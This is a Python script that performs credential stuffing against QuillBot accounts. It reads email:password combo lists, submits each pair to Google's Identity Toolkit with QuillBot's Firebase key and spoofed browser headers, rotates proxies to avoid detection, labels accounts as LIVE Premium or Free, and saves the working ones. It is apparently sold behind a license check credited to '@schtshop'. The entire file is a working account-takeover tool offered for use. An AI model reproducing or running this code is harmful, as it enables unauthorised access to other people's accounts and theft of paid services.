import requests
import json

def check_key(key, proxy=None):
    """
    Memeriksa validitas kunci dengan mengirimkan permintaan ke server lisensi.

    Args:
      key: Kunci lisensi yang akan diperiksa.
      proxy: Opsional, server proxy dalam format "ip:port".

    Returns:
      True jika kunci valid, False jika tidak valid.
    """
    url = f"https://apiqu-46b0165ac641.herokuapp.com//license.php?key={key}"

    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    } if proxy else None

    try:
        response = requests.get(url, proxies=proxies)
        response.raise_for_status()  # Raise an exception for bad status codes
        return "valid" in response.text.lower()
    except requests.exceptions.RequestException as e:
        print(f"Gagal memeriksa kunci - Terjadi kesalahan")
        return False


def login(username, password, proxy=None):
    """
    Logs in a user with the given username and password.

    Args:
      username: The user's email address.
      password: The user's password.
      proxy: Optional proxy server in the format "ip:port".

    Returns:
      A dictionary containing the user's information if login is successful,
      None otherwise.
    """

    url = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyCKK18QdZG32zJeaAJ8awVpCRKgIATUtTE"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "X-Client-Version": "Firefox/JsCore/9.8.1/FirebaseCore-web",
        "X-Firebase-gmpid": "1:174733774878:web:166594aa25a0605f2fde0f",
        "Origin": "https://quillbot.com",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "Content-Type": "application/json"
    }
    data = {
        "returnSecureToken": True,
        "email": username,
        "password": password
    }

    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    } if proxy else None

    try:
        response = requests.post(url, headers=headers, data=json.dumps(data), proxies=proxies)
        response.raise_for_status()  # Raise an exception for bad status codes

        response_json = response.json()

        # Check for login errors
        if "error" in response_json:
            print(f"\033[91mDIE = {username}:{password}\033[0m")
            return None

        id_token = response_json["idToken"]
        user_info = get_user_info(id_token, proxy)

        if user_info is None:
            return None

        if "customAuth" in user_info and user_info["customAuth"]:
            print(f"\033[92mLIVE = {username}:{password} - Premium\033[0m")
        else:
            print(f"\033[92mLIVE = {username}:{password} - Free\033[0m")

        return user_info

    except requests.exceptions.RequestException as e:
        print(f"\033[91mDIE = {username}:{password}\033[0m - An error occurred")
        return None


def get_user_info(id_token, proxy=None):
    """
    Retrieves user information using the provided ID token.

    Args:
      id_token: The user's ID token.
      proxy: Optional proxy server in the format "ip:port".

    Returns:
      A dictionary containing the user's information,
      or None if the request failed.
    """

    url = "https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=AIzaSyCKK18QdZG32zJeaAJ8awVpCRKgIATUtTE"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/json"
    }
    data = {"idToken": id_token}

    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    } if proxy else None

    try:
        response = requests.post(url, headers=headers, data=json.dumps(data), proxies=proxies)
        response.raise_for_status()  # Raise an exception for bad status codes

        response_json = response.json()
        users = response_json["users"]
        if len(users) > 0:
            return users[0]
        else:
            print("User not found.")
            return None

    except requests.exceptions.RequestException as e:
        print(f"An error occurred while getting user info ")
        return None


def login_with_combo(combo_file, live_output_file, proxy_file=None):
    """
    Reads username and password combinations from a combo list, attempts to log in,
    and saves live accounts to a separate file. Uses proxies from a proxy file if provided.

    Args:
      combo_file: Path to the combo list file (e.g., "combo.txt").
      live_output_file: Path to the output file for live accounts (e.g., "live.txt").
      proxy_file: Optional path to the proxy list file (e.g., "proxy.txt").
    """

    try:
        with open(combo_file, "r") as f, open(live_output_file, "w") as outfile:
            proxies = []
            if proxy_file:
                with open(proxy_file, "r") as pf:
                    proxies = [line.strip() for line in pf]
            proxy_index = 0

            for line in f:
                line = line.strip()
                if ":" in line:
                    username, password = line.split(":", 1)
                    proxy = proxies[proxy_index % len(proxies)] if proxies else None
                    login_result = login(username, password, proxy)
                    if login_result:
                        # Menambahkan status premium/free ke output
                        status = "Premium" if "customAuth" in login_result and login_result["customAuth"] else "Free"
                        outfile.write(f"{username}:{password} - {status}\n")
                    proxy_index += 1
                else:
                    print(f"Invalid line format: {line}")

    except FileNotFoundError:
        print(f"Combo file or proxy file not found: {combo_file} or {proxy_file}")

if __name__ == "__main__":
    print(
      """
██████╗ ██╗     ██╗██╗██╗     ██╗     ██████╗ ██████╗ ████████╗
██╔═══██╗██║     ██║██║██║     ██║     ██╔══██╗██╔═══██╗╚══██╔══╝
██║   ██║██║     ██║██║██║     ██║     ██████╔╝██║   ██║   ██║   
██║▄▄ ██║██║     ██║██║██║     ██║     ██╔══██╗██║   ██║   ██║   
╚██████╔╝╚██████╔╝██║███████╗███████╗██████╔╝╚██████╔╝   ██║   
╚══▀▀═╝  ╚═════╝ ╚═╝╚══════╝╚══════╝╚═════╝  ╚═════╝    ╚═╝   
                    CODE BY @schtshop                                                              
      """
  )
    # Input kunci lisensi
    license_key = input("Masukkan kunci lisensi: ") 
    if check_key(license_key):
        
        # --- Kode untuk meminta input file combo, proxy, dan output ---
        combo_file_path = input("Enter combo list: ")
        use_proxy = input("Use proxy? (y/N): ").lower()
        proxy_file_path = input("Enter proxy list: ") if use_proxy == "y" else None
        live_output_file_path = input("Enter output for live accounts: ")

        login_with_combo(combo_file_path, live_output_file_path, proxy_file_path) 
        
    else:
        print("Kunci tidak valid. Chat Devaloper @schtshop")
        exit()
